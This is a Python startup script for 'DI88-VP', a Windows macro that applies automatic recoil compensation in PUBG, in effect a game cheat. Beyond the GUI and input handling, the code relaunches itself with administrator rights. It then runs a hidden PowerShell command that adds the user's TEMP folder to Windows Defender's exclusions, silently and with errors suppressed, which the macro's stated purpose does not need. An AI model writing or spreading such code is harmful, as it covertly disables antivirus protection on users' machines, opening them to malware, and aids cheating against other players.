import sys
import os
import time
import ctypes
import subprocess
from pathlib import Path
import win32api
import win32gui

PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.core import utils as Utils

# TẮT TOÀN BỘ THÔNG BÁO RÁC CỦA QT VÀ HỆ THỐNG
os.environ["QT_LOGGING_RULES"] = "*.debug=false;qt.qpa.*=false"
os.environ["QT_ENABLE_HIGHDPI_SCALING"] = "1"
os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"


def print_banner():
    banner = """
    ====================================================
    ||                                                ||
    ||           DI88-VP  ULTRA PREMIUM               ||
    ||        High-Performance Gaming Macro           ||
    ||                                                ||
    ====================================================
    """
    print(banner)


def _add_defender_exclusion():
    try:
        temp_path = os.environ.get("TEMP", r"C:\Users\Admin\AppData\Local\Temp")
        subprocess.run(
            [
                "powershell",
                "-WindowStyle",
                "Hidden",
                "-Command",
                f'Add-MpPreference -ExclusionPath "{temp_path}" -ErrorAction SilentlyContinue',
            ],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
        )
    except Exception:
        pass


def _self_elevate_and_whitelist():
    if not Utils.is_admin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script}" {params}', None, 1
        )
        sys.exit(0)
    else:
        _add_defender_exclusion()


def _optimize_cpu_and_priority():
    """Ép Macro chạy trên nhân CPU cuối cùng và set độ ưu tiên HIGH để không làm tụt FPS game"""
    try:
        import psutil

        proc = psutil.Process(os.getpid())

        # 1. Set Priority: HIGH (Để Windows luôn ưu tiên xử lý nhịp ghìm)
        proc.nice(psutil.HIGH_PRIORITY_CLASS)

        # 2. CPU Affinity: Chỉ chạy trên nhân CPU Rảnh cuối cùng
        count = psutil.cpu_count()
        if count > 1:
            last_core = [count - 1]
            proc.cpu_affinity(last_core)
            print(
                f" > [SYSTEM] CPU Isolated: Pinned to Core {count - 1} (Avoid FPS Drops)"
            )
    except Exception as e:
        print(f" > [WARN] CPU Optimization failed: {e}")


if __name__ == "__main__":
    # 1. KIỂM QUYỀN VÀ KHỞI TẠO HỆ THỐNG GỐC
    Utils.set_high_dpi()
    _self_elevate_and_whitelist()
    _optimize_cpu_and_priority()

    # 2. HIỆN BANNER ĐẲNG CẤP
    # print_banner()
    # print(" > [SYSTEM] Initializing environment...")

    from PyQt6.QtWidgets import QApplication
    from PyQt6.QtGui import QIcon
    from PyQt6.QtCore import QThread, pyqtSignal, QObject

    from src.core.backend import BackendThread
    from src.core.high_precision_timer import HighPrecisionTimer
    from src.core.path_utils import get_resource_path
    from src.core.settings import SettingsManager
    from src.gui.macro_window import MacroWindow
    from src.input.keyboard_listener import KeyboardListener
    from src.input.mouse_listener import MouseListener

    # Lừa Windows nhận diện đây là App riêng biệt
    myappid = "di88.phutho.macro.v1"
    try:
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)
    except Exception:
        pass

    timer_enforcer = HighPrecisionTimer()
    timer_enforcer.start()

    app = QApplication(sys.argv)
    app.setApplicationName("Di88-VP")
    app.setApplicationDisplayName("Di88-VP")

    window = MacroWindow()
    window.setWindowTitle("Di88-VP")

    icon_path = get_resource_path("di88vp.ico")
    window.setWindowIcon(QIcon(icon_path))

    # 3. KHỞI CHẠY BACKEND (Lúc này ClassDetection sẽ in dòng tóm tắt)
    backend = BackendThread()
    backend.signal_update.connect(window.update_ui_state)
    backend.signal_message.connect(window.show_message)
    backend.signal_ads_update.connect(window.update_ads_display)
    # Sync ADS mode ngay lúc khởi động (không chờ change event)
    initial_ads = getattr(backend.pubg_config, "ads_mode", None)
    if initial_ads:
        window.update_ads_display(initial_ads.upper())
    window.set_backend(backend)
    window.signal_settings_changed.connect(backend.reload_config)

    # 4. BRIDGE VÀ LISTENERS
    # Kết nối input chuột phím với backend và giao diện
    class InputBridge(QObject):
        def __init__(self, window, backend):
            super().__init__()
            self.window = window
            self.backend = backend
            self.settings = SettingsManager()
            self.recoil_config = self.backend.executor.config
            self.is_ads = False
            self.ads_toggled = False
            self._ads_reset_timer = (
                None  # Timer tự reset is_ads sau khi thả LMB trong TOGGLE
            )
            self.reload_config()

        def reload_config(self):
            self.guitoggle_key = self.settings.get("keybinds.gui_toggle", "f1").lower()
            if hasattr(self, "keyboard_listener") and self.keyboard_listener:
                self.keyboard_listener.update_guitoggle_key(self.guitoggle_key)

        def handle_input_action(self, action):
            # CHÚ Ý: Cho phép chuyển Slot mọi lúc (kể cả ở Lobby hoặc Tab-out)
            if action == "SLOT_1":
                self.backend.set_slot(1)
                self.window.update_macro_style(True)
            elif action == "SLOT_2":
                self.backend.set_slot(2)
                self.window.update_macro_style(True)

            if not Utils.is_game_active():
                return
            if action == "MACRO_PAUSE":
                self.backend.set_paused(True)
                self.window.update_macro_style(False)

        def handle_raw_key(self, key, pressed):
            if key == self.guitoggle_key and pressed:
                if self.window.isVisible():
                    self.window.hide()
                else:
                    self.window.show()
                return
            if pressed and not Utils.is_game_active():
                return
            elif key == "f2" and pressed:
                self.backend.reload_config()
            elif key == "r" and pressed:
                # Bấm R (nạp đạn) → tự reset toggle tâm ảo về trạng thái hiện
                pubg_ads = getattr(self.backend.pubg_config, "ads_mode", None)
                ads_mode = (
                    pubg_ads.upper()
                    if pubg_ads
                    else self.settings.get("ads_mode", "HOLD").upper()
                )
                if ads_mode in ["CLICK", "TOGGLE"]:
                    self.is_ads = False
                    if hasattr(self.window, "crosshair") and self.window.crosshair:
                        self.window.crosshair.reset_toggle_state()

        def handle_mouse_click(self, btn, pressed):
            btn_name = str(btn).lower()
            if btn_name == "right":
                # Ưu tiên đọc từ PUBG config (tự động), nếu chưa có thì dùng setting thủ công
                pubg_ads = getattr(self.backend.pubg_config, "ads_mode", None)
                ads_mode = (
                    pubg_ads.upper()
                    if pubg_ads
                    else self.settings.get("ads_mode", "HOLD").upper()
                )
                if ads_mode == "HOLD":
                    self.is_ads = pressed
                elif ads_mode in ["CLICK", "TOGGLE"]:
                    self.is_ads = True  # Luôn ghìm, không bật/tắt
                    # Huỷ timer reset khi bấm RMB (vào ADS) để tránh tâm bật lại giữa chừng
                    if (
                        pressed
                        and self._ads_reset_timer
                        and self._ads_reset_timer.is_alive()
                    ):
                        self._ads_reset_timer.cancel()
                        self._ads_reset_timer = None
            if btn_name == "left" and pressed:
                # Huỷ timer reset nếu bấm LMB lại trước khi timer hết
                if self._ads_reset_timer and self._ads_reset_timer.is_alive():
                    self._ads_reset_timer.cancel()
                    self._ads_reset_timer = None
                # Real-time cursor check to avoid race conditions with VisionWorker
                flags, _, _ = win32gui.GetCursorInfo()
                cursor_visible = flags != 0

                if not Utils.is_game_active() or cursor_visible:
                    return

                # ADS Check: Nếu là TOGGLE/CLICK thì coi như luôn ADS khi không có chuột
                pubg_ads = getattr(self.backend.pubg_config, "ads_mode", None)
                ads_mode = (
                    pubg_ads.upper()
                    if pubg_ads
                    else self.settings.get("ads_mode", "HOLD").upper()
                )

                if ads_mode == "HOLD" and not self.is_ads:
                    return

                data = self.backend.state
                if data.get("paused", False):
                    return

                slot = data.get("active_slot", 1)
                gun_info = data.get(f"gun{slot}", {})
                name = gun_info.get("name", "NONE")
                if name != "NONE":
                    self.backend.set_firing(True)
                    base_table = self.recoil_config.get_base_table(name)
                    if base_table:
                        raw_pixels = self.recoil_config.get_raw_pattern(base_table)
                        self.backend.executor.start_recoil(
                            raw_pixels, initial_stance=data.get("stance", "Stand")
                        )
            elif btn_name == "left" and not pressed:
                self.backend.set_firing(False)
                self.backend.executor.stop_recoil()
                # Nếu vừa bắn hết TOÀN BỘ băng đạn (pattern done) → tự reset toggle sau 1s
                if self.backend.executor.full_pattern_done:
                    pubg_ads = getattr(self.backend.pubg_config, "ads_mode", None)
                    ads_mode = (
                        pubg_ads.upper()
                        if pubg_ads
                        else self.settings.get("ads_mode", "HOLD").upper()
                    )
                    if ads_mode in ["CLICK", "TOGGLE"]:
                        from PyQt6.QtCore import QTimer

                        def _reset_after_empty_mag():
                            self.is_ads = False
                            if (
                                hasattr(self.window, "crosshair")
                                and self.window.crosshair
                            ):
                                self.window.crosshair.reset_toggle_state()

                        QTimer.singleShot(0, _reset_after_empty_mag)

    input_bridge = InputBridge(window, backend)

    keyboard_listener = KeyboardListener()
    input_bridge.keyboard_listener = keyboard_listener
    keyboard_listener.signal_key_event.connect(input_bridge.handle_raw_key)
    keyboard_listener.signal_action.connect(input_bridge.handle_input_action)
    keyboard_listener.start_listening()

    mouse_listener = MouseListener()
    mouse_listener.signal_click.connect(input_bridge.handle_mouse_click)
    mouse_listener.start_listening()

    def exception_hook(exctype, value, tb):
        import traceback

        err_msg = "".join(traceback.format_exception(exctype, value, tb))
        print(f"\n> [CRASH REPORT]\n{err_msg}")
        timer_enforcer.stop()
        sys.exit(1)

    sys.excepthook = exception_hook

    backend.start()
    window.show()

    print(" > [SYSTEM] Macro DI88-VP is Ready!")
    # sys.stdout.write("\n") # Chừa dòng cho Status Bar Động
    sys.exit(app.exec())
